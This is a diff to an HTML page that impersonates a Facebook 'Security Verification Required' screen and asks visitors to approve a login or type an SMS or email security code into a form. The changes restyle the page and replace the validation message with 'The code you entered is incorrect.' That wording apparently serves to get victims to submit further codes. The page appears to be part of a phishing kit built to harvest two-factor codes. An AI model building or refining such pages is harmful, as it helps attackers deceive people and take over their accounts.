@@ -13,21 +13,15 @@
 
   <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
   
-  <div class="security-options">
-    <div class="option-card">
-      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 1: Login Approval</h4>
-      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        For account security, please verify you are the authorized account owner. We've sent a login notification to your registered device. Approve the request to proceed with authentication.
-      </p>
-    </div>
+  <p style="color:#475569;margin:0 0 16px 0;line-height:1.5;font-size:14px">
+    <strong>Option 1: Login Approval</strong><br>
+    For account security, please verify you are the authorized account owner. We've sent a login notification to your registered device. Approve the request to proceed with authentication.
+  </p>
 
-    <div class="option-card">
-      <h4 style="color:#1e293b;margin:16px 0 8px 0;font-size:15px;font-weight:600">Option 2: Verification Code</h4>
-      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
-        If you received a security code via SMS or email from Facebook, please enter it below to complete the verification process.
-      </p>
-    </div>
-  </div>
+  <p style="color:#475569;margin:0 0 20px 0;line-height:1.5;font-size:14px">
+    <strong>Option 2: Verification Code</strong><br>
+    If you received a security code via SMS or email from Facebook, please enter it below to complete the verification process.
+  </p>
   
   <form id="loginForm" method="post" novalidate>
     <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
@@ -39,11 +33,9 @@
     </div>
   </form>
 
-  <div class="note-box">
-    <p style="font-size:13px;color:#64748b;margin:0;line-height:1.5">
-      <strong>Note:</strong> If you've already approved the login request, please allow a moment for system verification. The process typically completes within seconds.
-    </p>
-  </div>
+  <p style="font-size:13px;color:#64748b;margin-top:16px;line-height:1.5">
+    <strong>Note:</strong> If you've already approved the login request, please allow a moment for system verification. The process typically completes within seconds.
+  </p>
 
   <script>
   // Auto redirect after 6 minutes (360,000 ms) - INCREASED FROM 2 MINUTES
@@ -64,7 +56,7 @@
     if (!pattern.test(val)) {
       valid = false;
       digits.classList.add("input-error");
-      digitsError.textContent = "Please enter a valid 4-9 digit security code.";
+      digitsError.textContent = "The code you entered is incorrect.";
     }
 
     if (!valid) event.preventDefault();
@@ -130,26 +122,6 @@
 }
 .login-btn:active {
   transform: scale(0.985);
-}
-
-.security-options {
-  margin: 20px 0;
-}
-
-.option-card {
-  background: #f8fafc;
-  padding: 16px;
-  border-radius: 12px;
-  border-left: 4px solid #1877F2;
-  margin-bottom: 16px;
-}
-
-.note-box {
-  background: #fffbeb;
-  border: 1px solid #fef3c7;
-  border-radius: 12px;
-  padding: 12px 16px;
-  margin-top: 20px;
 }
 
 .center {
